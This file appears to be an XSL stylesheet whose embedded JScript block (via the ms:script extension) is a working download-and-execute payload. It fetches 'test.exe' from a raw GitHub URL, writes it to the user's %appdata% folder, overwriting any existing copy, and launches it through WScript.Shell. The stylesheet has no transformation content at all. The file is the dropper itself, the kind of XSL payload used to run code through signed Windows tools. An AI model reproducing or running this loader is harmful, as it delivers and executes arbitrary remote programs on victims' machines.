<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var Source = "https://raw.githubusercontent.com/tconqueror/bla/master/test.exe";
var Target = "%appdata%\\test.exe";
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', Source, false);
Object.Send();

if (Object.Status == 200)
{
    // Create the Data Stream
    var Stream = WScript.CreateObject('ADODB.Stream');

    // Establish the Stream
    Stream.Open();
    Stream.Type = 1; // adTypeBinary
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    // Create an Empty Target File
    var File = WScript.CreateObject('Scripting.FileSystemObject');
    if (File.FileExists(Target))
    {
        File.DeleteFile(Target);
    }

    // Write the Data Stream to the File
    Stream.SaveToFile(Target, 2); // adSaveCreateOverWrite
    Stream.Close();
    var r = new ActiveXObject("WScript.Shell").Run("%appdata%\\test.exe");
}
]]> 
</ms:script>
</stylesheet>
